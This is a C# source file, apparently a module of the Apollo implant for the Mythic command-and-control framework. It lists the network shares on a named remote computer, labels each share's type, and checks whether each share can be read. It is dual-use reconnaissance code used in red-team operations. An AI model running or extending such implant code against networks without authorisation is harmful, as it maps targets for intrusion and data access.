#define COMMAND_NAME_UPPER

#if DEBUG
#undef NET_SHARES
#define NET_SHARES
#endif


#if NET_SHARES
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Mythic.Structs;
using Apollo.Jobs;
using Apollo.MessageInbox;
using Apollo.Tasks;
using Utils;
using static Native.Methods;
using static Native.Enums;
using static Native.Structures;
using static Native.Constants;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;

namespace Apollo.CommandModules
{
    class NetShares
    {
        public struct NetShareInformation
        {
            public string ComputerName;
            public string ShareName;
            public string Comment;
            public string Type;
            public bool Readable;
        }

        public static void Execute(Job job, Agent implant)
        {
            Task task = job.Task;
            string computer = task.parameters.Trim();

            if (string.IsNullOrEmpty(computer))
            {
                job.SetError("No computer given to list.");
                return;
            }

            try
            {
                var results = GetComputerShares(computer);
                job.SetComplete(results);

            } catch (Exception ex)
            {
                job.SetError($"Failed to list shares. Reason: {ex.Message}");
            }
        }


        public static SHARE_INFO_1[] EnumNetShares(string Server)
        {
            List<SHARE_INFO_1> ShareInfos = new List<SHARE_INFO_1>();
            int entriesread = 0;
            int totalentries = 0;
            int resume_handle = 0;
            int nStructSize = Marshal.SizeOf(typeof(SHARE_INFO_1));
            IntPtr bufPtr = IntPtr.Zero;
            StringBuilder server = new StringBuilder(Server);
            int ret = NetShareEnum(server, 1, ref bufPtr, MAX_PREFERRED_LENGTH, ref entriesread, ref totalentries, ref resume_handle);
            if (ret == 0)
            {
                IntPtr currentPtr = bufPtr;
                for (int i = 0; i < entriesread; i++)
                {
                    SHARE_INFO_1 shi1 = (SHARE_INFO_1)Marshal.PtrToStructure(currentPtr, typeof(SHARE_INFO_1));
                    ShareInfos.Add(shi1);
                    currentPtr = (IntPtr)(currentPtr.ToInt64() + nStructSize);
                }
                NetApiBufferFree(bufPtr);
                return ShareInfos.ToArray();
            }
            else
            {
                ShareInfos.Add(new SHARE_INFO_1("ERROR=" + ret.ToString(), SHARE_TYPE.STYPE_UNKNOWN, string.Empty));
                return ShareInfos.ToArray();
            }
        }


        public static NetShareInformation[] GetComputerShares(string computer)
        {
            string[] errors = { "ERROR=53", "ERROR=5" };
            List<NetShareInformation> results = new List<NetShareInformation>();
            SHARE_INFO_1[] computerShares = EnumNetShares(computer);
            
            if (computerShares.Length > 0)
            {
                foreach (SHARE_INFO_1 share in computerShares)
                {
                    var result = new NetShareInformation();
                    result.ComputerName = computer;
                    result.ShareName = share.shi1_netname;
                    result.Comment = share.shi1_remark;
                    try
                    {
                        string path = String.Format("\\\\{0}\\{1}", computer, share.shi1_netname);
                        var files = System.IO.Directory.GetFiles(path);
                        result.Readable = true; 
                    }
                    catch
                    {
                        result.Readable = false;
                    }
                    switch (share.shi1_type)
                    {
                        case SHARE_TYPE.STYPE_DISKTREE:
                            result.Type = "Disk Drive";
                            break;
                        case SHARE_TYPE.STYPE_PRINTQ:
                            result.Type = "Print Queue";
                            break;
                        case SHARE_TYPE.STYPE_DEVICE:
                            result.Type = "Communication Device";
                            break;
                        case SHARE_TYPE.STYPE_IPC:
                            result.Type = "Interprocess Communication (IPC)";
                            break;
                        case SHARE_TYPE.STYPE_SPECIAL:
                            result.Type = "Special Reserved for IPC.";
                            //result.Type = "Special share reserved for interprocess communication (IPC$) or remote administration of the server (ADMIN$). Can also refer to administrative shares such as C$, D$, E$, and so forth.";
                            break;
                        case SHARE_TYPE.STYPE_CLUSTER_FS:
                            result.Type = "Cluster Share";
                            break;
                        case SHARE_TYPE.STYPE_CLUSTER_SOFS:
                            result.Type = "Scale Out Cluster Share";
                            break;
                        case SHARE_TYPE.STYPE_CLUSTER_DFS:
                            result.Type = "DFS Share in Cluster";
                            break;
                        case SHARE_TYPE.STYPE_TEMPORARY:
                            result.Type = "Temporary Share";
                            break;
                        default:
                            result.Type = $"Unknown type ({share.shi1_type})";
                            break;

                    }
                    results.Add(result);
                }
            }
            return results.ToArray();
        }



    }
}
#endif